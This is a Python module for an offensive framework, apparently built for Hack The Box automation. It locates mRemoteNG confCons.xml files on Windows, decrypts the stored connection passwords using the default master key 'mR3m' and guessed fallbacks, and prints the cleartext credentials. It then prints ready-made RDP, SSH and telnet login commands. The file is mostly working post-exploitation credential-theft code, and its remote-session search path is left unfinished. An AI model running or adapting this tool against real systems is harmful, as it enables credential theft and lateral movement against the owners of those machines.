from core.module_base import ModuleBase, ModuleType, Platform
import os
import base64
import hashlib
from pathlib import Path


class MRemoteNGCreds(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "mremoteng_creds"
        self.description = "Find and decrypt mRemoteNG config.xml files using known AES-GCM decryption"
        self.author = "HTB-Auto"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["credentials", "mremoteng", "post-exploitation", "windows", "decrypt"]

        self.register_option("SESSION", "Session ID to use", required=False, default="")
        self.register_option("CONFIG_PATH", "Path to confCons.xml file (optional, will search if not provided)", required=False, default="")
        self.register_option("MASTER_PASSWORD", "Master password for decryption (default: mR3m)", required=False, default="mR3m")
        self.register_option("SEARCH_PATHS", "Additional paths to search (comma-separated)", required=False, default="")

    def _derive_key(self, password: str) -> bytes:
        """Derive AES key from master password using PBKDF2"""
        try:
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
            salt = b'\x00' * 16
            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)
            return key
        except ImportError:
            self.print_error("PyCryptodome not installed. Install with: pip install pycryptodome")
            return None

    def _decrypt_aes_gcm(self, encrypted_data: str, password: str) -> str:
        """Decrypt mRemoteNG password using AES-GCM"""
        try:
            from Crypto.Cipher import AES
        except ImportError:
            self.print_error("PyCryptodome not installed. Install with: pip install pycryptodome")
            return None

        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            
            if len(encrypted_bytes) < 29:
                return self._decrypt_aes_cbc(encrypted_data, password)
            
            salt = encrypted_bytes[0:16]
            nonce = encrypted_bytes[16:32]
            ciphertext = encrypted_bytes[32:-16]
            tag = encrypted_bytes[-16:]
            
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        except Exception as e:
            return self._decrypt_aes_cbc(encrypted_data, password)

    def _decrypt_aes_cbc(self, encrypted_data: str, password: str) -> str:
        """Fallback: Decrypt mRemoteNG password using AES-CBC (older versions)"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
        except ImportError:
            return None

        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            
            iv = encrypted_bytes[0:16]
            ciphertext = encrypted_bytes[16:]
            
            salt = b'\x00' * 16
            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            pad_len = decrypted[-1]
            if pad_len < 16:
                decrypted = decrypted[:-pad_len]
            
            return decrypted.decode('utf-8', errors='ignore').rstrip('\x00')
        except Exception as e:
            return None

    def _parse_config_xml(self, content: str) -> list:
        """Parse mRemoteNG config.xml and extract connection info"""
        connections = []
        
        try:
            import re
            
            node_pattern = re.compile(
                r'<Node[^>]*'
                r'Name="([^"]*)"[^>]*'
                r'(?:Username="([^"]*)")?[^>]*'
                r'(?:Password="([^"]*)")?[^>]*'
                r'(?:Hostname="([^"]*)")?[^>]*'
                r'(?:Protocol="([^"]*)")?',
                re.IGNORECASE | re.DOTALL
            )
            
            attr_pattern = re.compile(r'(\w+)="([^"]*)"')
            node_start_pattern = re.compile(r'<Node\s+([^>]*)/?>', re.IGNORECASE)
            
            for match in node_start_pattern.finditer(content):
                attrs_str = match.group(1)
                attrs = dict(attr_pattern.findall(attrs_str))
                
                if attrs.get('Type') == 'Container':
                    continue
                
                name = attrs.get('Name', 'Unknown')
                username = attrs.get('Username', '')
                password = attrs.get('Password', '')
                hostname = attrs.get('Hostname', '')
                protocol = attrs.get('Protocol', 'RDP')
                domain = attrs.get('Domain', '')
                port = attrs.get('Port', '')
                
                if password or hostname:
                    connections.append({
                        'name': name,
                        'username': username,
                        'password': password,
                        'hostname': hostname,
                        'protocol': protocol,
                        'domain': domain,
                        'port': port
                    })
            
        except Exception as e:
            self.print_error(f"Error parsing XML: {str(e)}")
        
        return connections

    def _search_config_files(self, session=None) -> list:
        """Search for mRemoteNG config files in common locations"""
        found_files = []
        
        common_paths = [
            "%APPDATA%\\mRemoteNG\\confCons.xml",
            "%USERPROFILE%\\AppData\\Roaming\\mRemoteNG\\confCons.xml",
            "%LOCALAPPDATA%\\mRemoteNG\\confCons.xml",
            "C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\confCons.xml",
            "C:\\Program Files\\mRemoteNG\\confCons.xml",
            "C:\\Program Files (x86)\\mRemoteNG\\confCons.xml",
        ]
        
        search_paths = self.get_option("SEARCH_PATHS")
        if search_paths:
            common_paths.extend(search_paths.split(","))
        
        if session:
            self.print_status("Searching for mRemoteNG config files on target...")
            
            search_cmd = 'dir /s /b C:\\confCons.xml 2>nul & dir /s /b "%APPDATA%\\mRemoteNG\\confCons.xml" 2>nul'
            
            for path in common_paths:
                expanded_path = path
                if "*" not in path:
                    check_cmd = f'if exist "{path}" echo FOUND:{path}'
                    self.print_status(f"Checking: {path}")
        else:
            import glob
            for path in common_paths:
                expanded = os.path.expandvars(path)
                if "*" in expanded:
                    matches = glob.glob(expanded)
                    found_files.extend(matches)
                elif os.path.exists(expanded):
                    found_files.append(expanded)
        
        return found_files

    def run(self) -> bool:
        self.print_status("mRemoteNG Credential Extractor")
        self.print_status("=" * 40)
        
        master_password = self.get_option("MASTER_PASSWORD")
        config_path = self.get_option("CONFIG_PATH")
        session = self.get_option("SESSION")
        
        config_content = None
        config_file = None
        
        if config_path:
            self.print_status(f"Using specified config file: {config_path}")
            if os.path.exists(config_path):
                try:
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        config_content = f.read()
                    config_file = config_path
                except Exception as e:
                    self.print_error(f"Error reading config file: {str(e)}")
                    return False
            else:
                self.print_error(f"Config file not found: {config_path}")
                return False
        else:
            self.print_status("Searching for mRemoteNG config files...")
            found_files = self._search_config_files(session if session else None)
            
            if found_files:
                self.print_good(f"Found {len(found_files)} config file(s)")
                for f in found_files:
                    self.print_status(f"  - {f}")
                
                config_file = found_files[0]
                try:
                    with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                        config_content = f.read()
                except Exception as e:
                    self.print_error(f"Error reading config file: {str(e)}")
                    return False
            else:
                self.print_warning("No config files found. Specify CONFIG_PATH option.")
                self.print_status("\nCommon locations:")
                self.print_status("  - %APPDATA%\\mRemoteNG\\confCons.xml")
                self.print_status("  - C:\\Users\\<user>\\AppData\\Roaming\\mRemoteNG\\confCons.xml")
                return False
        
        if not config_content:
            self.print_error("No config content to parse")
            return False
        
        self.print_status(f"\nParsing config file: {config_file}")
        connections = self._parse_config_xml(config_content)
        
        if not connections:
            self.print_warning("No connections found in config file")
            return False
        
        self.print_good(f"Found {len(connections)} connection(s)")
        self.print_status("")
        
        passwords_to_try = [master_password]
        if master_password != "mR3m":
            passwords_to_try.append("mR3m")
        passwords_to_try.extend(["", "password", "admin", "mremoteng"])
        
        credentials_found = []
        
        for conn in connections:
            self.print_status(f"Connection: {conn['name']}")
            self.print_status(f"  Hostname: {conn['hostname']}")
            self.print_status(f"  Protocol: {conn['protocol']}")
            self.print_status(f"  Username: {conn['username']}")
            if conn['domain']:
                self.print_status(f"  Domain: {conn['domain']}")
            if conn['port']:
                self.print_status(f"  Port: {conn['port']}")
            
            if conn['password']:
                decrypted = None
                used_password = None
                
                for pwd in passwords_to_try:
                    decrypted = self._decrypt_aes_gcm(conn['password'], pwd)
                    if decrypted:
                        used_password = pwd
                        break
                
                if decrypted:
                    self.print_good(f"  Password: {decrypted}")
                    if used_password:
                        self.print_status(f"  (Decrypted with master password: '{used_password}')")
                    
                    credentials_found.append({
                        'name': conn['name'],
                        'hostname': conn['hostname'],
                        'username': conn['username'],
                        'password': decrypted,
                        'protocol': conn['protocol'],
                        'domain': conn['domain']
                    })
                else:
                    self.print_warning(f"  Password: [ENCRYPTED - Could not decrypt]")
                    self.print_status(f"  Raw: {conn['password'][:50]}...")
            else:
                self.print_status("  Password: [EMPTY]")
            
            self.print_status("")
        
        if credentials_found:
            self.print_status("=" * 40)
            self.print_good("SUMMARY - Decrypted Credentials:")
            self.print_status("=" * 40)
            
            for cred in credentials_found:
                domain_str = f"{cred['domain']}\\" if cred['domain'] else ""
                self.print_good(f"  {cred['hostname']} ({cred['protocol']})")
                self.print_good(f"    {domain_str}{cred['username']}:{cred['password']}")
            
            self.print_status("")
            self.print_status("Usage hints:")
            for cred in credentials_found:
                if cred['protocol'].upper() == 'RDP':
                    domain_str = f"/d:{cred['domain']} " if cred['domain'] else ""
                    self.print_status(f"  xfreerdp /v:{cred['hostname']} /u:{cred['username']} /p:'{cred['password']}' {domain_str}/cert:ignore")
                elif cred['protocol'].upper() in ['SSH1', 'SSH2']:
                    self.print_status(f"  ssh {cred['username']}@{cred['hostname']}")
                elif cred['protocol'].upper() == 'TELNET':
                    self.print_status(f"  telnet {cred['hostname']}")
            
            return True
        else:
            self.print_warning("No credentials could be decrypted")
            self.print_status("Try specifying a different MASTER_PASSWORD")
            return False


def register_module():
    return MRemoteNGCreds()
